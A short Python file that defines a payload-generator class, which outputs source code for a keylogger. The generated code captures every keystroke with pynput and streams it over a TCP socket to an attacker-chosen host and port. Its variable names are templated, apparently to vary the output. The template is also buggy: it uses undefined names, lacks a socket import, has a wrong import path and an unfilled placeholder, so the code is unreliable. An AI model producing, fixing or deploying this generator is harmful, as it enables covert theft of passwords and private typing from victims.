class Payload:
    def __init__(self, host,port, strs):
        self.host,self.port,self.strs  = host,port,strs
    def create(self):
        return """
from pynput import Listener, Key
def {on_press}(k):\n\tconn.send(str(k).encode("UTF-8"))
{connected} = False\nwhile not {connected} :\n\ttry :
\t\tconn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
\t\tconn.connect(('{host}' , int({port})))
\t\t{connected} = True 
\texcept :\n\t{connected} = False\n\twhile {connected} :\n\t\ttry : 
\t\t\twith Listener(on_press={on_press}) as l:
\t\t\t\tl.join()
\t\texcept :
\t\t\t{connected} = False
        """.format(host = self.host, port = str(port), connected = strs[0])